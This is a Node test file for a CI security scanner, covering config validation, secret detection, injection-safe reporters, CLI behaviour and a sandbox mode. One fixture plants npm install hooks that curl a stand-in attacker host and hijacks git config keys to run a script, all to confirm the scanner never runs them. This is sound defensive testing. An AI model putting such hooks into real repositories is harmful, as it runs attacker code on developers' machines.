import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { readFile, writeFile, symlink, mkdir, chmod, access } from 'node:fs/promises';
import path from 'node:path';
import { scan, formatSarif, MACOS_SEATBELT_PROFILE } from '../src/index.js';
import { formatGitHub, formatSummary } from '../src/reporters/github-actions.js';
import { formatConsole } from '../src/reporters/console.js';
import { validateConfig, loadConfig } from '../src/config.js';
import { repo, git } from './helpers.js';
const exec = promisify(execFile);
const cli = path.resolve('src/cli.ts');
async function run(args: string[], env: Record<string, string | undefined> = {}) {
  try { return { ...(await exec(process.execPath, ['--import', 'tsx', cli, ...args], { env: { ...process.env, ...env } })), code: 0 }; }
  catch (e) { const err = e as { stdout: string; stderr: string; code: number }; return { stdout: err.stdout, stderr: err.stderr, code: err.code }; }
}
test('configuration rejects unknown/prototype keys and invalid types, rc wins over package', async t => {
  for (const value of [null, [], { constructor: [] }, JSON.parse('{"__proto__":[]}'), { typo: [] }, { ignore: 'a' }, { maxFileBytes: 1 }]) assert.throws(() => validateConfig(value));
  const root = await repo(t, { '.ciguardrc.json': '{"allowActions":["actions/*"]}', 'package.json': '{"ciguard":{"allowActions":["other/*"]}}' });
  assert.deepEqual((await loadConfig(root)).allowActions, ['actions/*']);
  await writeFile(path.join(root, '.ciguardrc.json'), '{');
  await assert.rejects(loadConfig(root), /Invalid JSON/);
});
test('nested gitignore respects negation, config ignores and symlink exclusion', async t => {
  const root = await repo(t, { '.gitignore': '*.ts\n!keep.ts\n', 'keep.ts': 'process.env.KEEP', 'hide.ts': 'process.env.HIDE', 'child/.gitignore': '!visible.ts\n', 'child/visible.ts': 'process.env.VISIBLE', 'generated/a.js': 'process.env.GENERATED' });
  await symlink('keep.ts', path.join(root, 'link.ts'));
  const report = await scan({ root, auditors: ['env-drift'], config: { ignore: ['generated/'] } });
  assert.deepEqual(report.findings.map(f => f.file), ['child/visible.ts', 'keep.ts']);
});
test('oversized files warn, binary files skip, disabled rules apply, reports are deterministic', async t => {
  const root = await repo(t, { 'large.txt': 'a'.repeat(1025), 'binary.bin': '\0AKIA' + 'Z4M8Q2W6E9R3T7Y1', 'a.ts': 'process.env.X' });
  const options = { root, config: { maxFileBytes: 1024, disabledRules: ['env/undocumented', 'scan/skipped-file'] } };
  const a = await scan(options), b = await scan(options);
  assert.deepEqual(a, b); assert.deepEqual(a.findings.map(f => f.ruleId), ['scan/skipped-file']);
});
test('reporters escape workflow-command and markdown injection and create valid SARIF locations', () => {
  const report = { version: '0.2.0' as const, filesScanned: 1, summary: { error: 1, warn: 0, info: 0 }, findings: [{ ruleId: 'secret/aws', severity: 'error' as const, file: 'a,b:c%\n`|<x>.txt', line: 2, message: 'redacted\n::error::fake <img>|`', suggestion: 'Rotate.' }] };
  const github = formatGitHub(report);
  assert.equal(github.split('\n').length, 1); assert.ok(github.includes('a%2Cb%3Ac%25%0A'));
  const summary = formatSummary(report); assert.ok(!summary.includes('<img>')); assert.ok(summary.includes('&lt;img&gt;'));
  assert.ok(!formatConsole(report).includes('\n::error::'));
  const sarif = JSON.parse(JSON.stringify(formatSarif(report)));
  assert.equal(sarif.version, '2.1.0'); assert.equal(sarif.runs[0].results[0].locations[0].physicalLocation.region.startLine, 2);
  assert.ok(sarif.runs[0].results[0].locations[0].physicalLocation.artifactLocation.uri.includes('%0A'));
});
test('CLI enforces thresholds, JSON/SARIF formats and usage failures', async t => {
  const root = await repo(t, { 'a.ts': 'process.env.REQUIRED' });
  const json = await run(['scan', root, '--format', 'json']);
  assert.equal(json.code, 0); assert.equal(JSON.parse(json.stdout).summary.warn, 1);
  assert.equal((await run(['scan', root, '--fail-on', 'warn'])).code, 1);
  const sarif = await run(['scan', root, '--format', 'sarif']); assert.equal(JSON.parse(sarif.stdout).version, '2.1.0');
  for (const args of [['scan', root, '--format', 'bad'], ['scan', root, '--fail-on', 'info'], ['scan', root, '--auditor', 'bad'], ['scan', root, '--staged'], ['unknown']]) assert.equal((await run(args)).code, 2);
  assert.equal((await run(['--help'])).code, 0); assert.equal((await run(['--version'])).stdout.trim(), '0.2.0');
});
test('GitHub mode writes outputs and summary even when findings fail the gate', async t => {
  const root = await repo(t, { 'key.txt': 'AKIA' + 'Z4M8Q2W6E9R3T7Y1' });
  const summary = path.join(root, 'summary.md'), output = path.join(root, 'outputs.txt');
  const r = await run(['scan', root, '--format', 'github'], { GITHUB_STEP_SUMMARY: summary, GITHUB_OUTPUT: output });
  assert.equal(r.code, 1); assert.ok(r.stdout.startsWith('::error file=key.txt,line=1'));
  assert.equal(await readFile(output, 'utf8'), 'errors=1\nwarnings=0\nfindings=1\n');
  assert.ok((await readFile(summary, 'utf8')).includes('CI Guard audit'));
});
test('MCP CLI is a clean stdio subprocess with working initialization and EOF shutdown', async t => {
  const root = await repo(t); const { spawn } = await import('node:child_process');
  const child = spawn(process.execPath, ['--import', 'tsx', cli, '--mcp', '--root', root]);
  let stdout = ''; child.stdout.on('data', c => { stdout += String(c); });
  let stderr = ''; child.stderr.on('data', c => { stderr += String(c); });
  const done = new Promise<number | null>((resolve, reject) => { child.once('close', resolve); child.once('error', reject); });
  child.stdin.end(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2024-11-05', capabilities: {}, clientInfo: { name: 'client', version: '1' } } }) + '\n');
  assert.equal(await done, 0, stderr); assert.equal(JSON.parse(stdout).result.protocolVersion, '2024-11-05');
});
test('A7: dense token matches scale linearly with accurate line numbers', async t => {
  const count = 2000;
  const line = `AKIA${'Z4M8Q2W6E9R3T7Y1'}\n`;
  const root = await repo(t, { 'dense.txt': line.repeat(count) });
  const start = performance.now();
  const report = await scan({ root, auditors: ['secrets'] });
  const elapsed = performance.now() - start;
  assert.equal(report.findings.length, count);
  assert.equal(report.findings[0]!.line, 1);
  assert.equal(report.findings[count - 1]!.line, count);
  assert.ok(elapsed < 1500, `Expected linear scan under 1500ms, took ${elapsed.toFixed(1)}ms`);
});
test('A8: missing or broken git in a directory with .git metadata fails closed instead of silently scanning untracked files', async t => {
  const root = await repo(t, { 'untracked.txt': 'AKIA' + 'Z4M8Q2W6E9R3T7Y1' });
  await mkdir(path.join(root, '.git'));
  await assert.rejects(scan({ root, auditors: ['secrets'] }), /Git repository metadata found at scan root, but git execution failed/);

  const prevPath = process.env.PATH;
  process.env.PATH = '';
  try {
    await assert.rejects(scan({ root, auditors: ['secrets'] }), /Git repository metadata found at scan root, but git execution failed/);
  } finally {
    process.env.PATH = prevPath;
  }
});
test('v0.2.0: OS-boundary --sandbox and --no-git zero-subprocess mode block network egress and child hooks', async t => {
  const root = await repo(t, {
    '.env.example': 'API_URL=https://api.example.com\n',
    'src/app.ts': 'export const url = process.env.API_URL;\n',
    'package.json': JSON.stringify({
      name: 'untrusted-target',
      scripts: {
        preinstall: 'curl -s https://evil.example.invalid/pwn',
        postinstall: 'curl -s https://evil.example.invalid/pwn',
      },
      dependencies: { yaml: '2.9.1' },
    }),
  });
  const marker = path.join(root, 'hook-ran.txt');
  const hookScript = path.join(root, 'hook.sh');
  await writeFile(hookScript, `#!/bin/sh\necho pwned > "${marker}"\n`);
  await chmod(hookScript, 0o755);
  git(root, 'init', '-q');
  git(root, 'add', '.');
  git(root, 'config', 'core.fsmonitor', hookScript);
  git(root, 'config', 'core.sshCommand', hookScript);
  git(root, 'config', 'core.gitProxy', hookScript);

  // 1. --sandbox CLI scan succeeds with 0 findings and never invokes hooks or package manager scripts
  const sandboxed = await run(['scan', root, '--sandbox', '--format', 'json']);
  assert.equal(sandboxed.code, 0, sandboxed.stderr);
  assert.equal(JSON.parse(sandboxed.stdout).summary.error, 0);
  await assert.rejects(access(marker), /ENOENT/);

  // 2. --no-git pure filesystem scan succeeds even when PATH is empty and .git exists
  const prevPath = process.env.PATH;
  process.env.PATH = '';
  try {
    const noGitReport = await scan({ root, noGit: true });
    assert.equal(noGitReport.summary.error, 0);
    assert.equal(noGitReport.summary.warn, 0);
  } finally {
    process.env.PATH = prevPath;
  }

  // 3. On macOS, verify kernel Seatbelt profile blocks actual TCP socket egress at OS boundary
  if (process.platform === 'darwin') {
    await assert.rejects(
      exec('/usr/bin/sandbox-exec', [
        '-p',
        MACOS_SEATBELT_PROFILE,
        process.execPath,
        '-e',
        'import("node:net").then(({connect})=>{const s=connect(443,"1.1.1.1",()=>process.exit(0));s.on("error",()=>process.exit(42));});',
      ]),
      (err: { code?: number }) => err.code === 42,
    );
  }
});
test('v0.2.0: Golden clean-repo benchmark suite passes all 4 auditors with zero false positives', async t => {
  const shaCheckout = '11bd71901bbe5b1630ceea73d27597364c9af683';
  const shaNode = '49933ea5288caeca8642d1e84afbd3f7d6820020';
  const sha256Digest = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';

  const cleanRoot = await repo(t, {
    '.env.example': 'DATABASE_URL=postgres://localhost:5432/app\nREDIS_URL=redis://localhost:6379\nPORT=8080\n',
    'docker-compose.yml': 'services:\n  api:\n    image: node:22-alpine\n    environment:\n      - DATABASE_URL=${DATABASE_URL}\n      - REDIS_URL=${REDIS_URL}\n',
    'Dockerfile': 'FROM node:22-alpine\nENV PORT=8080\n',
    'package.json': JSON.stringify({
      name: 'golden-clean-repo',
      version: '1.0.0',
      dependencies: {
        ignore: '7.0.5',
        yaml: '^2.9.1',
      },
    }),
    'package-lock.json': JSON.stringify({
      name: 'golden-clean-repo',
      lockfileVersion: 3,
      packages: {
        'node_modules/yaml': {
          version: '2.9.1',
          resolved: 'https://registry.npmjs.org/yaml/-/yaml-2.9.1.tgz',
          integrity: 'sha512-f8Kp2Rz9Wq5Tx7La0Md3Nv6Bs1Hc4Yj9f8Kp2Rz9Wq5Tx7La0Md3Nv6Bs1Hc4Yj==',
        },
      },
    }),
    'src/index.ts': [
      'export const db = process.env.DATABASE_URL;',
      'export const redis = process.env.REDIS_URL;',
      'export const port = process.env.PORT;',
      'export const commitSha = "11bd71901bbe5b1630ceea73d27597364c9af683";',
    ].join('\n'),
    '.github/workflows/ci.yml': [
      'name: Hardened CI',
      'on: [push, pull_request]',
      'permissions:',
      '  contents: read',
      'jobs:',
      '  test:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      `      - uses: actions/checkout@${shaCheckout}`,
      `      - uses: actions/setup-node@${shaNode}`,
      `      - uses: docker://alpine@sha256:${sha256Digest}`,
      '      - env:',
      '          PR_TITLE: ${{ github.event.pull_request.title }}',
      '          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}',
      '        run: |',
      '          echo "Checking PR #$(( ${{ github.event.pull_request.number }} ))"',
      '          test -n "$PR_TITLE"',
      '          test -n "$DEPLOY_KEY"',
    ].join('\n'),
    '.github/workflows/pr-labeler.yml': [
      'name: Safe PR Target Labeler (No Checkout)',
      'on: pull_request_target',
      'permissions:',
      '  pull-requests: write',
      'jobs:',
      '  label:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - env:',
      '          PR_NUM: ${{ github.event.pull_request.number }}',
      '        run: echo "Labeling PR $PR_NUM"',
    ].join('\n'),
    '.gitlab-ci.yml': [
      'stages: [test]',
      `image: node:22-alpine@sha256:${sha256Digest}`,
      'include:',
      '  - project: "security/templates"',
      `    ref: "${shaCheckout}"`,
      '    file: "/templates/sast.yml"',
      'unit_test:',
      '  stage: test',
      '  script:',
      '    - npm test',
    ].join('\n'),
  });

  const report = await scan({ root: cleanRoot });
  assert.deepEqual(report.findings, []);
  assert.deepEqual(report.summary, { error: 0, warn: 0, info: 0 });
});
